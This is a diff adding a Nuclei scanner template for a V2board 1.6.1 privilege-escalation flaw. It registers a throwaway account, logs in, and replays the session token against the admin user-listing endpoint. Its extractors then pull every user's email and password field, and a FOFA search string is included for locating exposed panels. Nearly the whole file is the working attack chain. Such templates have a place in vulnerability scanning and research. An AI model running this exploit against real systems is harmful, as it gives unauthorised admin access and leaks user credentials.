@@ -1,0 +1,99 @@
+id: v2boardv161-privilege-escalation
+info:
+  name: v2board 权限提升
+  author: wjlin0
+  severity: critical
+  description: V2board是一个多用户代理工具管理面板。在其1.6.1版本中,引入了对于用户Session的缓存机制,服务器会将用户的认证信息储存在Redis缓存中。
+  metadata:
+    fofa-query: '"v2board"'
+  reference:
+    - https://github.com/Threekiii/Vulhub-Reproduce/blob/master/V2board%201.6.1%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.md
+  tags: privilege
+variables:
+  username: "{{to_lower(rand_base(6))}}@gmail.com" 
+http:
+  - raw:
+      - |-
+        POST /api/v1/passport/auth/register HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        email={{username}}&password=12345678&invite_code=&email_code=
+      
+      - |-
+        POST /api/v1/passport/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        
+        email={{username}}&password=12345678&invite_code=&email_code=
+
+      - |+
+        GET /api/v1/user/info HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        authorization: {{auth_data}}
+        Connection: close
+
+      - |+
+        GET /api/v1/admin/user/fetch HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        authorization: {{auth_data}}
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - "data"
+          - "token"
+          - "auth_data"
+        condition: and
+      - type: word
+        part: body_2
+        words:
+          - "data"
+          - "token"
+          - "auth_data"
+        condition: and
+      - type: word
+        part: body_3
+        words:
+          - "data"
+          - "email"
+          - "last_login_at"
+        condition: and
+      - type: word
+        part: body_4
+        words:
+          - "token"
+          - "is_admin"
+          - "last_login_at"
+        condition: and
+    
+    extractors:
+      - type: regex
+        part: body_1
+        name: auth_data
+        group: 1
+        internal: true
+        regex:
+          - "\"auth_data\":\"(.*)\""
+      - type: regex
+        part: body_2
+        name: auth_data
+        group: 1
+        internal: true
+        regex:
+          - "\"auth_data\":\"(.*)\""
+      - type: json
+        part: body_4
+        name: url
+        json:
+          - ".data|.[]|.email"
+          - ".data|.[]|.password"
+# digest: 4a0a00473045022100bc1f75763c7c73a49bec9baf41cad6fc888ff419005c82ee77296fda59dfb9dd022032a44738a5484adb9515f2c407346faae4d0db962b29749aee3cb669d8242c11:9d8cf424f0e932381bf27cf1e926b867
